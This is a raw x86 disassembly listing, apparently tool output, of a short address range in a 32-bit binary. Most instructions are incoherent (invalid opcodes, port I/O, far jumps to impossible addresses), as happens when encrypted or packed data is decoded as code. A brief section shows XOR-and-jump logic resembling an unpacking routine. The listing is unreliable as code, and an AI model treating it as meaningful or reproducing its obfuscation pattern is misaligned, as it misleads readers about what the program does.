  4152ad:	mov    edi,0x6859d7e1
  4152b2:	sahf   
  4152b3:	ss jno 0x415319
  4152b6:	mov    ds:0x1d4d899,eax
  4152bb:	ret    0x12c1
  4152be:	retf   0x8d14
  4152c1:	xchg   BYTE PTR [edx+0x39],ch
  4152c4:	pop    esi
  4152c5:	or     al,0xf7
  4152c7:	or     eax,0xb245b679
  4152cc:	push   ebp
  4152cd:	inc    edx
  4152ce:	cld    
  4152cf:	jecxz  0x41533d
  4152d1:	mov    ebx,DWORD PTR [ebx+edx*1-0x41]
  4152d5:	das    
  4152d6:	fsubr  DWORD PTR [ebx+0x2b]
  4152d9:	in     al,0x44
  4152db:	shl    DWORD PTR [eax],0xb4
  4152de:	fidiv  DWORD PTR [edx]
  4152e0:	xor    DWORD PTR [esi+0x153d0fd6],edi
  4152e6:	mov    dh,0x3c
  4152e8:	test   esi,ebp
  4152ea:	stc    
  4152eb:	xchg   esi,eax
  4152ec:	add    edx,DWORD PTR [esi+0x648b6eb6]
  4152f2:	mov    WORD PTR [ebp+0x23085895],ds
  4152f8:	xchg   DWORD PTR [edx],ebp
  4152fa:	icebp  
  4152fb:	and    al,0xd6
  4152fd:	dec    eax
  4152fe:	aam    0x41
  415300:	test   eax,0xbf0cf106
  415305:	jo     0x415326
  415307:	xor    BYTE PTR cs:[edx+edi*2],dl
  41530b:	std    
  41530c:	mov    al,ds:0x638d0ca5
  415311:	inc    eax
  415312:	cwde   
  415313:	test   eax,0x5fb135a2
  415318:	mov    eax,ds:0x43900c96
  41531d:	test   eax,0x5962b77d
  415322:	xchg   esp,eax
  415323:	cmp    al,0x2c
  415325:	inc    ebp
  415326:	out    0x2d,al
  415328:	jl     0x4152ad
  41532a:	sbb    BYTE PTR [edi],al
  41532c:	in     eax,0xff
  41532e:	lods   eax,DWORD PTR ds:[esi]
  41532f:	mov    ds:0x8bfc00f9,al
  415334:	dec    edx
  415335:	shr    DWORD PTR ds:0x76f4f4ed,0x58
  41533c:	adc    esi,ebp
  41533e:	inc    edx
  41533f:	test   BYTE PTR [edi+0x5cd10c13],ch
  415345:	dec    DWORD PTR [esp+ebp*4+0x62]
  415349:	(bad)  
  41534b:	mov    gs,WORD PTR [eax-0xc]
  41534e:	mov    al,ds:0x3094f733
  415353:	rcl    BYTE PTR [ebx],0x51
  415356:	nop
  415357:	stc    
  415358:	inc    edi
  415359:	cmp    al,BYTE PTR [edx-0x1669d7f8]
  41535f:	lds    edx,FWORD PTR [ebp-0x44]
  415362:	mov    ebp,DWORD PTR [ecx]
  415364:	sbb    eax,0xecf1dab4
  415369:	aaa    
  41536a:	ret    0x2fab
  41536d:	dec    esi
  41536e:	repz jl 0x4153a6
  415371:	sbb    ah,BYTE PTR [eax-0x6e]
  415374:	sti    
  415375:	nop
  415376:	les    esi,FWORD PTR [ecx+ebx*4+0x39]
  41537a:	add    BYTE PTR [esi],dh
  41537c:	fbld   TBYTE PTR [esi+0x55]
  41537f:	adc    al,0x29
  415381:	das    
  415382:	mov    ds:0x7a86e300,eax
  415387:	das    
  415388:	xor    DWORD PTR [edx],edx
  41538a:	rcl    DWORD PTR [edx+0x63],1
  41538d:	mov    BYTE PTR ds:0x9b40e8f3,dh
  415393:	or     ch,BYTE PTR [edi]
  415395:	xor    al,al
  415397:	push   es
  415398:	fisttp DWORD PTR [esi]
  41539a:	adc    al,0xd3
  41539c:	or     DWORD PTR [ebx-0x73a5d296],ebx
  4153a2:	(bad)  
  4153a4:	push   0x30
  4153a6:	scas   al,BYTE PTR es:[edi]
  4153a7:	inc    ebx
  4153a8:	cmc    
  4153a9:	mov    edi,ecx
  4153ab:	mov    ebx,0x5d57a3ae
  4153b0:	dec    ecx
  4153b1:	mov    edx,0x6a8fd975
  4153b6:	pop    edi
  4153b7:	cdq    
  4153b8:	jge    0x415354
  4153ba:	ins    DWORD PTR es:[edi],dx
  4153bb:	test   BYTE PTR ds:0xad3554bb,bh
  4153c1:	sbb    dh,cl
  4153c3:	push   esp
  4153c4:	das    
  4153c5:	mov    edi,0xc677e34d
  4153ca:	loopne 0x415420
  4153cc:	stc    
  4153cd:	and    BYTE PTR [edx-0x69],al
  4153d0:	out    dx,eax
  4153d1:	daa    
  4153d2:	jecxz  0x4153c7
  4153d4:	mov    cl,0x3a
  4153d6:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4153d8:	cli    
  4153d9:	pop    esi
  4153da:	es bnd call 0x9eb93615
  4153e1:	cs dec ebx
  4153e3:	push   ds
  4153e4:	outs   dx,BYTE PTR ds:[esi]
  4153e5:	arpl   WORD PTR [esi],bx
  4153e7:	lods   eax,DWORD PTR ds:[esi]
  4153e8:	pop    ebx
  4153e9:	or     DWORD PTR [edi+eax*1],ecx
  4153ec:	inc    ecx
  4153ed:	dec    ecx
  4153ee:	push   esp
  4153ef:	loope  0x415388
  4153f1:	(bad)  
  4153f2:	repz push 0xffffffc7
  4153f5:	or     BYTE PTR [ebx-0xb],bh
  4153f8:	add    al,0xba
  4153fa:	push   cs
  4153fb:	daa    
  4153fc:	sbb    bl,ah
  4153fe:	adc    BYTE PTR [edi-0x6761db0a],bl
  415404:	sub    esi,DWORD PTR [edi+0x47e16c01]
  41540a:	jl     0x415478
  41540c:	int3   
  41540d:	push   ebp
  41540e:	xchg   esp,eax
  41540f:	jno    0x41548a
  415411:	and    al,0x6f
  415413:	pop    edx
  415414:	fsub   DWORD PTR [ecx+0xebfb9c8]
  41541a:	inc    eax
  41541b:	out    dx,al
  41541c:	out    dx,eax
  41541d:	addr16 ds jge 0x4153f2
  415421:	ror    bh,cl
  415423:	sbb    ch,BYTE PTR [esi]
  415425:	mov    dh,0x40
  415427:	or     ecx,DWORD PTR [esi-0x14]
  41542a:	adc    ebp,DWORD PTR [esi+0x1f]
  41542d:	out    dx,eax
  41542e:	dec    ecx
  41542f:	mov    esp,0xa9db1103
  415434:	or     ah,ch
  415436:	sub    DWORD PTR [ebp+0x346edf7d],eax
  41543c:	xor    edx,0x3ed130e4
  415442:	daa    
  415443:	scas   eax,DWORD PTR es:[edi]
  415444:	test   DWORD PTR [eax+ebx*8+0x17],ecx
  415448:	jbe    0x41540e
  41544a:	and    esp,DWORD PTR [esi-0x7828f4f8]
  415450:	lahf   
  415451:	data16 jae 0x41549a
  415454:	nop
  415455:	add    ebp,DWORD PTR [esp+ecx*2+0x11ddef05]
  41545c:	push   ss
  41545d:	add    edi,edi
  41545f:	sti    
  415460:	xchg   esp,eax
  415461:	sub    ebp,DWORD PTR ds:[ecx]
  415464:	(bad)  
  415465:	imul   esi,DWORD PTR [eax+0x14a38d14],0x2b18b610
  41546f:	arpl   WORD PTR [edi],bx
  415471:	sub    eax,0x1a
  415474:	sbb    eax,0xc203a199
  415479:	mov    DWORD PTR [ebp+0x8],eax
  41547c:	mov    eax,DWORD PTR [ebp-0x18]
  41547f:	xor    eax,ecx
  415481:	add    eax,edx
  415483:	mov    edx,DWORD PTR [ebp+0x14]
  415486:	imul   eax,DWORD PTR [edx]
  415489:	mov    edx,DWORD PTR [ebp-0x4]
  41548c:	xor    edx,ecx
  41548e:	mov    ecx,DWORD PTR [ebp+0x8]
  415491:	lea    ecx,[edx+ecx*1+0x32729c]
  415498:	cmp    ecx,eax
  41549a:	je     0x416385
  4154a0:	mov    edi,DWORD PTR [ebp-0x18]
  4154a3:	mov    eax,DWORD PTR [ebp+0x8]
  4154a6:	mov    edx,DWORD PTR [ebp+0x14]
  4154a9:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4154ad:	mov    ecx,0x7510855
  4154b2:	xor    edx,edx
  4154b4:	xor    edi,ecx
  4154b6:	jmp    0x41579a
  4154bb:	sub    dh,cl
  4154bd:	sub    BYTE PTR [ecx+0x71b159f7],bl
  4154c3:	xchg   esi,edx
  4154c5:	push   ebx
  4154c6:	mov    ch,0x8d
  4154c8:	pop    edi
  4154c9:	test   DWORD PTR [ebx+0x36],0xb9707f02
  4154d0:	jle    0x415542
  4154d2:	jo     0x41545d
  4154d4:	sbb    esi,esp
  4154d6:	fstp   st(1)
  4154d8:	je     0x41547b
  4154da:	mov    eax,0x21651a05
  4154df:	xchg   ecx,eax
  4154e0:	stos   BYTE PTR es:[edi],al
  4154e1:	xor    DWORD PTR ds:0xba133d9b,0x5b
  4154e8:	inc    esi
  4154e9:	repz sahf 
  4154eb:	stos   DWORD PTR es:[edi],eax
  4154ec:	sti    
  4154ed:	dec    eax
  4154ee:	inc    esp
  4154ef:	int3   
  4154f0:	add    ecx,eax
  4154f2:	xchg   esp,eax
  4154f3:	outs   dx,BYTE PTR ds:[esi]
  4154f4:	pop    edx
  4154f5:	inc    ecx
  4154f6:	mov    ds:0x8a8c7552,eax
  4154fb:	cli    
  4154fc:	lea    eax,[ebx+0x3f]
  4154ff:	or     BYTE PTR [edi],0x4
  415502:	arpl   WORD PTR [esi],bx
  415504:	jnp    0x415509
  415506:	mov    esp,0xd885a176
  41550b:	clc    
  41550c:	imul   esp,DWORD PTR [ebp-0x24],0x6f6bc443
  415513:	fidiv  DWORD PTR [eax-0x719a828d]
  415519:	retf   
  41551a:	mov    ebx,0x1e4ed293
  41551f:	retf   0x28cf
  415522:	add    eax,0xfd95f1b4
  415527:	les    esp,FWORD PTR [edi+0x44]
  41552a:	xchg   edx,eax
  41552b:	fstp   DWORD PTR [edi-0x22c9df61]
  415531:	sub    DWORD PTR [esi-0x51],esi
  415534:	nop
  415535:	cmc    
  415536:	in     eax,dx
  415537:	mov    eax,0x430b8211
  41553c:	sar    DWORD PTR [esi+0x20],0x1c
  415540:	mov    eax,0x457cfbe4
  415545:	cmp    BYTE PTR [ecx+ecx*1-0x30],ah
  415549:	cmp    al,0x4e
  41554b:	jge    0x4155a3
  41554d:	pop    ebp
  41554e:	test   al,0xc0
  415550:	hlt    
  415551:	push   ebp
  415552:	pop    edx
  415553:	push   ss
  415554:	and    BYTE PTR [ebp-0x57],ch
  415557:	enter  0xce5d,0x73
  41555b:	jnp    0x415581
  41555d:	js     0x415564
  41555f:	mov    ah,BYTE PTR [edx+0x2c]
  415562:	jo     0x4155c5
  415564:	popa   
  415565:	les    ebp,FWORD PTR [ecx+0x4f593f42]
  41556b:	push   cs
  41556c:	out    0x4e,al
  41556e:	and    dh,BYTE PTR [esp+ebp*4+0xb6aee0f]
  415575:	fstp   QWORD PTR [ebx]
  415577:	sbb    BYTE PTR [eax+0x1f],0xbc
  41557b:	add    al,0x34
  41557d:	(bad)  
  41557e:	or     al,0x99
  415580:	fs mov ebp,0x16aa896f
  415586:	and    BYTE PTR [edx-0x54],dl
  415589:	leave  
  41558a:	or     al,0x64
  41558c:	jecxz  0x415556
  41558e:	cdq    
  41558f:	int3   
  415590:	xor    ch,BYTE PTR [eax+0x667d3dfc]
  415596:	push   ebp
  415597:	ins    DWORD PTR es:[edi],dx
  415598:	aaa    
  415599:	jns    0x4155a9
  41559b:	das    
  41559c:	ret    0xe84b
  41559f:	dec    ecx
  4155a0:	in     al,0x2d
  4155a2:	pusha  
  4155a3:	push   ebx
  4155a4:	xor    ah,cl
  4155a6:	push   0xffffff91
  4155a8:	pop    ebx
  4155a9:	cmp    eax,0xf7fdc793
  4155ae:	sbb    ch,BYTE PTR [edi]
  4155b0:	dec    ebp
  4155b1:	loope  0x4155a0
  4155b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155b4:	adc    al,0x10
  4155b6:	mov    bh,0x19
  4155b8:	loop   0x41554a
  4155ba:	shr    DWORD PTR [edx-0xb],1
  4155bd:	and    al,0xc0
  4155bf:	mov    BYTE PTR [ebx-0x7ce74c2a],dh
  4155c5:	ficom  DWORD PTR [ebx-0x358503dd]
  4155cb:	fistp  WORD PTR [ebx-0x242560a8]
  4155d1:	fcmove st,st(6)
  4155d3:	les    edi,FWORD PTR [ebx+0x62]
  4155d6:	pop    ecx
  4155d7:	leave  
  4155d8:	or     bh,BYTE PTR [esi-0x776c79d]
  4155de:	repz mov ch,0x9e
  4155e1:	fisubr WORD PTR [ebx-0x1a]
  4155e4:	jle    0x41564b
  4155e6:	inc    ebx
  4155e7:	ds ja  0x415647
  4155ea:	out    0xc0,al
  4155ec:	add    esp,edi
  4155ee:	shr    DWORD PTR [ebx+0x50],1
  4155f1:	(bad)  
  4155f2:	into   
  4155f3:	shr    ch,0x6
  4155f6:	lods   al,BYTE PTR ds:[esi]
  4155f7:	jae    0x415611
  4155f9:	pop    esp
  4155fa:	xor    DWORD PTR [eax-0x4f],edx
  4155fd:	jp     0x415593
  4155ff:	xor    al,0xc1
  415601:	inc    esi
  415602:	bound  ebp,QWORD PTR [ecx+0x66]
  415605:	test   DWORD PTR ds:[ebx],ebx
  415608:	sub    ebx,DWORD PTR [edx-0x75354489]
  41560e:	sub    DWORD PTR [esi-0x78],0xfffffff5
  415612:	jmp    0x422683
  415617:	push   ds
  415618:	cmp    DWORD PTR [ebp+eiz*4-0x3a320f6],edi
  41561f:	adc    eax,0x458431a9
  415624:	in     al,0xde
  415626:	add    BYTE PTR ds:0xe724e223,ch
  41562c:	inc    ebp
  41562d:	jge    0x4156ab
  41562f:	inc    ebx
  415630:	or     eax,DWORD PTR [edx+0xd]
  415633:	ror    BYTE PTR [edi+0x70],cl
  415636:	mov    ebp,0x20a42e4c
  41563b:	mov    ah,0xaf
  41563d:	pop    es
  41563e:	jmp    0x4156b0
  415640:	sbb    BYTE PTR [esi-0x66],0x5c
  415644:	inc    edx
  415645:	jmp    0x9637c08
  41564a:	mov    ebx,0x6b3e9c82
  41564f:	cmp    eax,DWORD PTR [edx-0x9d41e4d]
  415655:	cmp    bl,ah
  415657:	es xchg ebp,eax
  415659:	mov    dh,0x15
  41565b:	ret    0xcd32
  41565e:	lds    ebp,FWORD PTR [ecx]
  415660:	loopne 0x4156a6
  415662:	mov    ah,0xa3
  415664:	stc    
  415665:	std    
  415666:	mov    ah,0x1e
  415668:	jmp    DWORD PTR [edi+0x70cfc908]
  41566e:	push   cs
  41566f:	xchg   esi,eax
  415670:	hlt    
  415671:	in     eax,dx
  415672:	ret    
  415673:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415674:	pop    ss
  415675:	mov    bl,0x71
  415677:	call   0xfa2c:0xbdace6b0
  41567e:	fild   QWORD PTR ds:0xa872d36e
  415684:	aas    
  415685:	push   edx
  415686:	in     al,0xa1
  415688:	fld    TBYTE PTR [ecx-0x35]
  41568b:	int    0x5f
  41568d:	or     ch,BYTE PTR [esi+ebx*2+0x2a87ae9b]
  415694:	mov    eax,0x87b50fb5
  415699:	fwait
  41569a:	dec    ecx
  41569b:	enter  0x6f0d,0x46
  41569f:	sbb    BYTE PTR [eax+0x25545ab6],al
  4156a5:	mov    BYTE PTR [edx+edx*4],ah
  4156a8:	jmp    0xc8974633
  4156ad:	ins    BYTE PTR es:[edi],dx
  4156ae:	push   0x46664ab
  4156b3:	fild   DWORD PTR [ebp-0x7a]
  4156b6:	dec    ecx
  4156b7:	aas    
  4156b8:	cld    
  4156b9:	pop    esp
  4156ba:	in     al,0x6c
  4156bc:	(bad)  
  4156bd:	shl    DWORD PTR [edi+0x5c3f03f0],cl
  4156c3:	repnz or BYTE PTR [esi],dh
  4156c6:	ds and eax,0x9c8b148d
  4156cc:	inc    ecx
  4156cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156ce:	mov    eax,ds:0x7c968767
  4156d3:	mov    eax,ds:0xf4b2da3b
  4156d8:	sbb    eax,0xb7bb3fcb
  4156dd:	adc    al,0xe9
  4156df:	cmc    
  4156e0:	jp     0x4156d0
  4156e2:	or     esp,DWORD PTR [bp+0x5074]
  4156e7:	jp     0x415674
  4156e9:	dec    ecx
  4156ea:	call   0x93cd5e82
  4156ef:	add    al,0xb4
  4156f1:	xchg   edx,eax
  4156f2:	adc    ecx,DWORD PTR [edx+0x62c4a5fa]
  4156f8:	xlat   BYTE PTR ds:[ebx]
  4156f9:	adc    al,0xcd
  4156fb:	mov    dh,0xac
  4156fd:	jmp    0xd03caba8
  415702:	in     al,0x32
  415704:	jae    0x4156b9
  415706:	daa    
  415707:	sub    BYTE PTR [ebx+eax*2+0xb91a881],bh
  41570e:	adc    al,BYTE PTR [edi]
  415710:	ins    BYTE PTR es:[edi],dx
  415711:	sub    BYTE PTR [esi-0x2a],ah
  415714:	xchg   edi,eax
  415715:	jne    0x41576f
  415717:	call   0x95c3:0x141d1f7d
  41571e:	hlt    
  41571f:	repnz (bad) 
  415721:	fstp   DWORD PTR [ebx]
  415723:	fstp   TBYTE PTR [ecx]
  415725:	push   ebp
  415726:	pop    eax
  415727:	je     0x415731
  415729:	xlat   BYTE PTR ds:[ebx]
  41572a:	call   0xaa3094e3
  41572f:	sbb    eax,0xca2ef420
  415734:	pop    bp
  415736:	push   ebp
  415737:	mov    dh,0x3b
  415739:	ja     0x4156ec
  41573b:	or     ah,dh
  41573d:	sar    BYTE PTR [edi-0xebc769a],cl
  415743:	sbb    dl,BYTE PTR [esi+eax*1-0x1a]
  415747:	data16 (bad) 
  415749:	cld    
  41574a:	jb     0x415794
  41574c:	jno    0x4157a0
  41574e:	aad    0x84
  415750:	adc    ebx,DWORD PTR [edx+0x2a2ad32f]
  415756:	sbb    BYTE PTR [edi+0x328e9e32],ah
  41575c:	fidivr WORD PTR es:[ecx+0x26]
  415760:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415761:	and    esi,ebx
  415763:	push   esi
  415764:	cs fwait
  415766:	repnz pusha 
  415768:	outs   dx,DWORD PTR ds:[esi]
  415769:	cld    
  41576a:	inc    esi
  41576b:	xchg   ebx,eax
  41576c:	(bad)  [edx]
  41576e:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  415770:	lods   al,BYTE PTR ds:[esi]
  415771:	test   eax,0xbd891e79
  415776:	pop    eax
  415777:	push   eax
  415778:	sub    DWORD PTR [esi],esi
  41577a:	jmp    0xed13:0x1663d89a
  415781:	loope  0x4157d4
  415783:	out    0xa1,eax
  415785:	test   eax,0xa73d8edb
  41578a:	scas   eax,DWORD PTR es:[edi]
  41578b:	xor    bh,ch
  41578d:	inc    ebx
  41578e:	ret    
  41578f:	inc    esi
  415790:	retf   
  415791:	jmp    0x4157b1
  415793:	push   edi
  415794:	mov    esi,0xeae7fa44
  415799:	call   0x300:0x32729cbe
  4157a0:	(bad)  
  4157a1:	div    edi
  4157a3:	mov    edx,DWORD PTR [ebp-0x4]
  4157a6:	jmp    0x415a8a
  4157ab:	adc    al,0xcd
  4157ad:	inc    esi
  4157ae:	rol    BYTE PTR [ecx+0x51],cl
  4157b1:	xchg   esp,eax
  4157b2:	int    0x7b
  4157b4:	rcl    DWORD PTR [esi],1
  4157b6:	test   BYTE PTR [ebx],dh
  4157b8:	jo     0x415759
  4157ba:	scas   eax,DWORD PTR es:[edi]
  4157bb:	jg     0x4157cc
  4157bd:	jg     0x41582f
  4157bf:	mov    ecx,0xe970707e
  4157c4:	jno    0x41578b
  4157c6:	inc    esi
  4157c7:	push   edx
  4157c8:	jecxz  0x415824
  4157ca:	addr16 call 0xb110:0x23f149cb
  4157d2:	mov    ebx,0xa78adeb6
  4157d7:	pop    ecx
  4157d8:	push   cs
  4157d9:	fmul   QWORD PTR ds:0x5fba78b
  4157df:	jp     0x4157b2
  4157e1:	sbb    DWORD PTR [edi],esp
  4157e3:	loopne 0x41580e
  4157e5:	icebp  
  4157e6:	pop    ebp
  4157e7:	arpl   WORD PTR [ecx-0x357b271c],di
  4157ed:	push   ebp
  4157ee:	enter  0xdf28,0xe6
  4157f2:	pop    ecx
  4157f3:	sub    esi,DWORD PTR [ecx]
  4157f5:	mov    eax,0x84788a24
  4157fa:	sub    DWORD PTR ds:0x4a8769e4,ecx
  415800:	add    cl,BYTE PTR [esi+0x61]
  415803:	ret    0x7726
  415806:	cld    
  415807:	retf   
  415808:	ins    BYTE PTR es:[edi],dx
  415809:	(bad)  
  41580a:	call   0x47081b43
  41580f:	jl     0x415879
  415811:	enter  0xf7fb,0xc1
  415815:	dec    ecx
  415816:	ja     0x415872
  415818:	xchg   BYTE PTR [eax-0x41],dh
  41581b:	(bad)  
  41581d:	scas   al,BYTE PTR es:[edi]
  41581e:	pop    edi
  41581f:	cmp    BYTE PTR [eax+0x80e5778],0xf8
  415826:	sbb    DWORD PTR [edi+0x37017088],ecx
  41582c:	mov    al,ds:0xd8d7f22f
  415831:	inc    edx
  415832:	jno    0x41580b
  415834:	jge    0x415862
  415836:	push   edi
  415837:	pop    esi
  415838:	aaa    
  415839:	fsub   st(4),st
  41583b:	mov    ecx,0x84c1de64
  415840:	mul    DWORD PTR [ebx-0x102135a9]
  415846:	lods   eax,DWORD PTR ds:[esi]
  415847:	out    dx,al
  415848:	je     0x415826
  41584a:	mov    ds:0x664be791,al
  41584f:	xor    ah,BYTE PTR [ebx+0x61]
  415852:	jne    0x415834
  415854:	jb     0x415836
  415856:	xchg   ebp,eax
  415857:	sbb    DWORD PTR [ebx-0x638971dc],edi
  41585d:	(bad)  
  41585e:	icebp  
  41585f:	dec    edi
  415860:	ss inc edi
  415862:	or     ebx,esi
  415864:	das    
  415865:	xor    eax,0xeb33c7c3
  41586a:	mov    WORD PTR [eax-0x71736937],ax
  415871:	mov    ds:0xc57d8f95,al
  415876:	pop    eax
  415877:	stos   DWORD PTR es:[edi],eax
  415878:	lds    ebx,FWORD PTR [eax-0x1c]
  41587b:	xchg   esp,eax
  41587c:	push   edx
  41587d:	push   ds
  41587e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41587f:	nop
  415880:	pop    esi
  415881:	out    0x95,eax
  415883:	push   ss
  415884:	jb     0x41581e
  415886:	test   eax,0x6235f3f6
  41588b:	inc    ebx
  41588c:	test   eax,0xb0d4226
  415891:	frstor [esi+0x7]
  415894:	les    ebx,FWORD PTR [esi]
  415896:	(bad)  
  415897:	jae    0x4158f1
  415899:	pop    es
  41589a:	and    cl,ch
  41589c:	dec    ecx
  41589d:	pop    ss
  41589e:	push   esi
  41589f:	or     BYTE PTR [edx+0x37],0x86
  4158a3:	sub    DWORD PTR [esi],eax
  4158a5:	loopne 0x415881
  4158a7:	das    
  4158a8:	lods   eax,DWORD PTR ds:[esi]
  4158a9:	and    esp,edx
  4158ab:	ror    bh,0x12
  4158ae:	mov    dh,0x44
  4158b0:	push   0x3d351f1b
  4158b5:	ins    DWORD PTR es:[edi],dx
  4158b6:	mov    cl,0xc8
  4158b8:	rol    BYTE PTR [edi],cl
  4158ba:	mov    ch,0x39
  4158bc:	dec    edx
  4158bd:	nop
  4158be:	jbe    0x41589b
  4158c0:	cmp    eax,0x1ec4688c
  4158c5:	mov    cl,0x41
  4158c7:	je     0x415905
  4158c9:	inc    esp
  4158ca:	cmp    al,0x8f
  4158cc:	mov    ds:0xf6aaec07,al
  4158d1:	mov    ds:0xdd2b070d,eax
  4158d6:	inc    ecx
  4158d7:	mov    dl,0xbc
  4158d9:	cmp    dh,BYTE PTR ds:0x57dfc5f1
  4158df:	ret    0x352
  4158e2:	sub    esp,ebp
  4158e4:	int    0x82
  4158e6:	add    BYTE PTR [ebp+0x47],dl
  4158e9:	retf   
  4158ea:	loope  0x415925
  4158ec:	push   0xffffffc1
  4158ee:	ficom  DWORD PTR [esi+0x716d94b7]
  4158f4:	pop    eax
  4158f5:	mov    ds:0x29d967ba,al
  4158fa:	dec    esp
  4158fb:	test   DWORD PTR [edi],0xb7edfb3a
  415901:	loop   0x415950
  415903:	sub    al,BYTE PTR [eax-0x8]
  415906:	mov    dl,0x68
  415908:	stos   DWORD PTR es:[edi],eax
  415909:	cmc    
  41590a:	shl    DWORD PTR [ebp+0x69],cl
  41590d:	mov    esp,0xb8db9098
  415912:	mov    DWORD PTR [edi+0x704a70f4],ebp
  415918:	scas   eax,DWORD PTR es:[edi]
  415919:	xchg   ch,al
  41591b:	adc    eax,0x9a1f8ed5
  415920:	outs   dx,DWORD PTR ds:[esi]
  415921:	jo     0x4158ce
  415923:	pop    ebp
  415924:	in     al,dx
  415925:	and    ebp,DWORD PTR [ecx+0x59282488]
  41592b:	xchg   edi,eax
  41592c:	cli    
  41592d:	je     0x415975
  41592f:	std    
  415930:	rcl    BYTE PTR ds:0x1894bd2f,cl
  415936:	jnp    0x4159a2
  415938:	xor    eax,0x6921d35b
  41593d:	dec    ecx
  41593e:	(bad)  
  41593f:	popa   
  415940:	mov    al,0xf3
  415942:	cmp    ch,BYTE PTR [eax-0x48a632aa]
  415948:	ret    0x9561
  41594b:	add    eax,0xfec066d6
  415950:	inc    esi
  415951:	lahf   
  415952:	test   esi,ebp
  415954:	rol    DWORD PTR [esp-0x14],0x1d
  415959:	jae    0x41593b
  41595b:	stc    
  41595c:	mov    al,ds:0x3ea41c4e
  415961:	cld    
  415962:	jae    0x415935
  415964:	and    DWORD PTR [ebx],0xffffffe0
  415967:	sbb    eax,0x1d566b57
  41596c:	enter  0xaab8,0xf3
  415970:	adc    eax,0xe3eacd4a
  415975:	lods   eax,DWORD PTR ds:[esi]
  415976:	inc    edi
  415977:	pop    esi
  415978:	fcmovnu st,st(6)
  41597a:	jle    0x4159bc
  41597c:	jbe    0x415983
  41597e:	add    edi,DWORD PTR [ecx+0x48395c8f]
  415984:	mov    eax,0xbe8c526c
  415989:	mov    esp,0xb38e2dde
  41598e:	or     ch,BYTE PTR [edi+0x5]
  415991:	add    DWORD PTR ds:0xd08b6d,ebp
  415997:	and    ah,BYTE PTR [edx+0x5baf6ae5]
  41599d:	scas   al,BYTE PTR es:[edi]
  41599e:	mov    ebx,0x97d7a385
  4159a3:	repz leave 
  4159a5:	add    eax,0x84e6297d
  4159aa:	xchg   ebx,eax
  4159ab:	cmp    eax,0x68a34e94
  4159b0:	out    dx,al
  4159b1:	cmp    DWORD PTR [eax-0x1c],0x36
  4159b5:	push   edx
  4159b6:	push   es
  4159b7:	call   0xe9c9:0x54f6c036
  4159be:	loopne 0x4159f9
  4159c0:	mov    dh,dl
  4159c2:	adc    al,0x11
  4159c4:	cmp    esp,ecx
  4159c6:	(bad)  
  4159c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159c8:	push   ecx
  4159c9:	dec    eax
  4159ca:	and    ebp,DWORD PTR [edx+0x62a1e758]
  4159d0:	push   es
  4159d1:	imul   ebx,DWORD PTR [esi+0x7b],0x45161e8c
  4159d8:	cmp    BYTE PTR [ebp+0x62f9f621],bl
  4159de:	into   
  4159df:	xor    ecx,eax
  4159e1:	jl     0x415a0a
  4159e3:	adc    eax,0xd510c71
  4159e8:	push   esp
  4159e9:	cld    
  4159ea:	sub    ebx,DWORD PTR [ebp+0x3ef34a3b]
  4159f0:	addr16 test edx,ebx
  4159f3:	or     BYTE PTR [ebp+0x535f94e4],0xb3
  4159fa:	xor    eax,0xbac5022b
  4159ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a00:	(bad)  
  415a01:	pop    esi
  415a02:	xor    al,0xfe
  415a04:	pop    ebp
  415a05:	xchg   esi,eax
  415a06:	mov    dl,BYTE PTR gs:[eax+eax*4+0x74f5a779]
  415a0e:	dec    esi
  415a0f:	dec    esp
  415a10:	sub    dl,dl
  415a12:	inc    esp
  415a13:	ss dec ebx
  415a15:	push   es
  415a16:	jb     0x415a44
  415a18:	mov    eax,ds:0xc1b30c75
  415a1d:	hlt    
  415a1e:	dec    edi
  415a1f:	fst    QWORD PTR [edi-0x16]
  415a22:	into   
  415a23:	retf   
  415a24:	aas    
  415a25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a26:	jae    0x4159e4
  415a28:	retf   
  415a29:	sahf   
  415a2a:	sbb    edx,DWORD PTR [ecx]
  415a2c:	das    
  415a2d:	xchg   esp,eax
  415a2e:	xchg   BYTE PTR [ecx+0x634fcd5c],ch
  415a34:	(bad)  
  415a36:	mov    WORD PTR [edi-0x76adee53],?
  415a3c:	jle    0x415a5f
  415a3e:	out    dx,eax
  415a3f:	(bad)  
  415a40:	mov    dh,0x87
  415a42:	dec    edx
  415a43:	ds pop eax
  415a45:	mov    WORD PTR [esi],ds
  415a47:	sbb    BYTE PTR [eax-0x74a0c5a3],dh
  415a4d:	(bad)  
  415a4e:	xor    ecx,eax
  415a50:	dec    edi
  415a51:	push   esp
  415a52:	dec    edx
  415a53:	ins    BYTE PTR es:[edi],dx
  415a54:	fbld   TBYTE PTR [ebx+0x4c]
  415a57:	cdq    
  415a58:	rcl    ecx,cl
  415a5a:	push   ebp
  415a5b:	mov    DWORD PTR [ebp+0x64960876],edx
  415a61:	les    edx,FWORD PTR [esi+0x53]
  415a64:	popa   
  415a65:	inc    edi
  415a66:	in     al,dx
  415a67:	mov    ds:0xfa35fd42,al
  415a6c:	inc    esp
  415a6d:	inc    esp
  415a6e:	out    0x65,al
  415a70:	loopne 0x415a82
  415a72:	imul   edi,DWORD PTR [eax-0x54],0xc486cf
  415a79:	mov    bh,BYTE PTR [edi-0x77e821a2]
  415a7f:	aaa    
  415a80:	inc    ebp
  415a81:	mov    eax,ds:0x9630e1d3
  415a86:	jns    0x415a96
  415a88:	jmp    0x8e128e3c
  415a8d:	test   BYTE PTR [edx],al
  415a8f:	pushf  
  415a90:	jb     0x415ac4
  415a92:	add    cl,ch
  415a94:	fild   WORD PTR [edx]
  415a96:	add    BYTE PTR [eax],al
  415a98:	sub    dl,BYTE PTR [eax-0x24]
  415a9b:	mov    esp,0x6eaabc6a
  415aa0:	popa   
  415aa1:	pop    ecx
  415aa2:	xchg   ebp,eax
  415aa3:	aas    
  415aa4:	fidiv  WORD PTR [esi+ebp*1-0x48]
  415aa9:	or     eax,0x7eb9707f
  415aae:	jo     0x415b20
  415ab0:	sbb    eax,0xf1b6e991
